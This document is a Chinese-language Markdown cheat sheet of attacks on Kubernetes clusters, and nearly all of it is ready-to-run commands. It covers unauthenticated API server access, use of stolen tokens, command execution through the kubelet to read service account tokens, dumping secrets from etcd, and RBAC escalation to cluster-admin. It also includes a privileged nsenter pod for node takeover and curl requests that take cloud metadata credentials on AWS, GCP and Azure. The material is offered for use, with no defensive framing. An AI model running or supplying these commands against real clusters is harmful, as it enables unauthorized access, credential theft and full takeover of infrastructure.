# K8s 集群层面攻击

## 1. API Server 未授权访问

### 1.1 匿名访问（8080 端口 / 错误配置）
```bash
# 不安全端口（8080）直接访问
curl http://API_SERVER:8080/api/v1/namespaces
curl http://API_SERVER:8080/api/v1/secrets

# 匿名用户权限测试
curl -sk https://API_SERVER:6443/api/v1/namespaces/default/pods
# 如果返回 200 → 匿名访问启用
```

### 1.2 通过 Token 访问
```bash
# 使用窃取的 Token
TOKEN="eyJhbGciOi..."
curl -sk -H "Authorization: Bearer $TOKEN" https://API_SERVER:6443/api

# 枚举权限（关键步骤）
# 检查能否列出 secrets
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://API_SERVER:6443/api/v1/secrets 2>&1 | head -5

# 检查能否创建 pods
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://API_SERVER:6443/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"default","verb":"create","resource":"pods"}}}'
```

### 1.3 kubectl 使用
```bash
# 配置 kubeconfig
kubectl config set-cluster pwn --server=https://API_SERVER:6443 --insecure-skip-tls-verify=true
kubectl config set-credentials pwn --token=$TOKEN
kubectl config set-context pwn --cluster=pwn --user=pwn
kubectl config use-context pwn

# 信息收集
kubectl get nodes -o wide
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl auth can-i --list    # 当前权限列表
```

## 2. Kubelet 攻击（10250/10255）

### 2.1 只读端口（10255）
```bash
# 信息泄露：列出所有 Pod 及其环境变量
curl -s http://NODE_IP:10255/pods | python3 -c "
import json,sys
pods = json.load(sys.stdin)['items']
for p in pods:
    ns = p['metadata']['namespace']
    name = p['metadata']['name']
    print(f'[{ns}] {name}')
    for c in p['spec']['containers']:
        for e in c.get('env', []):
            if any(k in e.get('name','').lower() for k in ['pass','key','secret','token']):
                print(f'  ENV: {e[\"name\"]}={e.get(\"value\",\"<from-ref>\")}')
"
```

### 2.2 读写端口（10250）
```bash
# 列出 Pod
curl -sk https://NODE_IP:10250/pods

# 在指定 Pod 中执行命令
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME \
  -d "cmd=id"

curl -sk https://NODE_IP:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

# 也可用 kubeletctl 工具
kubeletctl -s NODE_IP pods
kubeletctl -s NODE_IP exec "id" -p POD -c CONTAINER -n NAMESPACE
```

## 3. etcd 攻击（2379）

etcd 存储 K8s 所有状态数据，包括 Secrets（base64 编码）。

```bash
# 直接访问（无认证）
etcdctl --endpoints=http://ETCD_IP:2379 get / --prefix --keys-only | head -50

# 提取所有 Secrets
etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets --prefix --print-value-only

# 如果需要证书认证
etcdctl --endpoints=https://ETCD_IP:2379 \
  --cert=/path/to/cert --key=/path/to/key --cacert=/path/to/ca \
  get /registry/secrets --prefix

# 提取 ServiceAccount Token
etcdctl --endpoints=http://ETCD_IP:2379 \
  get /registry/secrets/kube-system --prefix --print-value-only | strings | grep 'eyJ'
```

## 4. RBAC 权限滥用

### 4.1 高危权限组合
| 权限 | 危害 |
|------|------|
| create pods | 创建特权 Pod → 节点接管 |
| list secrets | 读取所有密码/Token |
| create clusterrolebindings | 自我提权为 cluster-admin |
| create serviceaccounts/token | 生成高权限 Token |
| patch daemonsets | 在所有节点部署后门 |

### 4.2 RBAC 提权路径
```bash
# 如果有 create rolebindings 权限
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:default

# 如果有 create serviceaccounts/token
kubectl create token default --duration=999999h

# 如果有 patch deployments（注入到现有高权限 Pod）
kubectl patch deployment DEPLOY_NAME -p '{"spec":{"template":{"spec":{"containers":[{"name":"pwn","image":"alpine","command":["sleep","infinity"],"securityContext":{"privileged":true}}]}}}}'
```

## 5. 横向移动

### 5.1 Pod 间移动
```bash
# 发现内部服务
env | grep SERVICE
kubectl get svc --all-namespaces

# 直接访问 ClusterIP 服务
curl http://10.96.x.x:PORT
```

### 5.2 节点接管
```bash
# 创建特权 Pod 指定到目标节点
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: node-pwn
spec:
  nodeName: TARGET_NODE
  hostNetwork: true
  hostPID: true
  containers:
  - name: pwn
    image: alpine
    command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/bash"]
    securityContext:
      privileged: true
EOF
```

## 6. 云 Metadata 利用

在云环境的 K8s 集群中，Pod 可能能访问云 Metadata：
```bash
# AWS
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
# Azure
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## 7. Helm / Tiller（旧版本）

Tiller（Helm v2）如果存在，通常有 cluster-admin 权限：
```bash
# 检查 Tiller
kubectl get pods -n kube-system | grep tiller
# Tiller gRPC 端口 44134
curl http://TILLER_IP:44134
```
